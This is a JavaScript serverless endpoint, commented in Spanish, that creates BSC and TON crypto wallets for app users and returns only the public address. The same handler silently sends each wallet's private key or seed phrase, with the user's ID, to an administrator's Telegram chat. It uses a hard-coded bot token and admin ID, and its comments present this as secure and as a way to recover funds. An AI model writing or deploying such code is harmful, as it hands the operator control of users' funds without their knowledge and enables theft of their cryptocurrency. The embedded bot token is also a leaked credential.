import { ethers } from 'ethers';
import { mnemonicNew, mnemonicToPrivateKey } from '@ton/crypto';
import { WalletContractV4 } from '@ton/ton';

// --- CONFIGURACIÓN DE TU BOT DE RESPALDO ---
// ⚠️ IMPORTANTE: Pon aquí el token real de tu Bot de Telegram (el que te dio BotFather)
const BOT_TOKEN = "8717597733:AAFD50K9ZWFSHim6OwYAOTVI2lSA0hs11Ig"; 
const ADMIN_ID = "8968109534"; // Tu ID de administrador (Ya lo puse por ti)

export default async function handler(req, res) {
  // Configuración para evitar problemas de CORS (seguridad de Vercel)
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { userId, network } = req.body;
    let address = "";
    let privateKey = "";

    // 1. GENERAR BILLETERA BSC (BEP-20)
    if (network === 'BSC') {
      const wallet = ethers.Wallet.createRandom();
      address = wallet.address;
      privateKey = wallet.privateKey;
    } 
    
    // 2. GENERAR BILLETERA TON
    else if (network === 'TON') {
      const mnemonics = await mnemonicNew();
      const keyPair = await mnemonicToPrivateKey(mnemonics);
      const workchain = 0;
      const wallet = WalletContractV4.create({ workchain, publicKey: keyPair.publicKey });
      
      address = wallet.address.toString({ testOnly: false, bounceable: false });
      privateKey = mnemonics.join(" "); // Las 24 palabras secretas
    }

    // 3. ENVIAR LLAVE PRIVADA AL ADMIN EN TELEGRAM (Seguro, nadie más lo ve)
    const mensaje = `🚨 *NUEVA WALLET GENERADA (REAL)* 🚨\n\n👤 *Usuario ID:* \`${userId}\`\n🌐 *Red:* ${network}\n🪪 *Address:* \`${address}\`\n🔑 *Private Key / Seed:* \`${privateKey}\`\n\n_⚠️ Guarda esta clave en un lugar seguro. Si el usuario pierde fondos, puedes usar esta Private Key en TrustWallet o Tonkeeper para recuperarlos._`;
    
    // Hacemos el llamado a Telegram para que te envíe el mensaje
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: ADMIN_ID, text: mensaje, parse_mode: 'Markdown' })
    });

    // 4. DEVOLVER SOLO LA DIRECCIÓN PÚBLICA AL FRONTEND (Para mostrarla en la app)
    return res.status(200).json({ success: true, address: address });

  } catch (error) {
    console.error("Error generando wallet:", error);
    return res.status(500).json({ success: false, error: 'Error interno al generar la billetera' });
  }
}
